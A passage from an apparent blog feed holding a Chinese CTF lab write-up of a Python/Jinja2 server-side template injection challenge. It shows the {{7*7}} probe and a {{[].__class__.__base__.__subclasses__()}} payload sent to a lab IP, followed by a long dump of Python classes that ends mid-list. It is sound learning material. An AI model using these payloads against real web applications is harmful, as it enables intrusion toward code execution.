+  </entry>
+  <entry>
+    <title>攻防世界-Web_python_template_injection</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+
+<p>进入靶机网址提示</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
+
+<p>知道这是一道python模板注入</p>
+<p>url输入 </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
+
+<p>判断存在SSTI注入</p>
+<p>查看网站模块，url输入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">URL http://<span class="hljs-number">61.147</span><span class="hljs-number">.171</span><span class="hljs-number">.105</span>:<span class="hljs-number">50859</span>/[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span 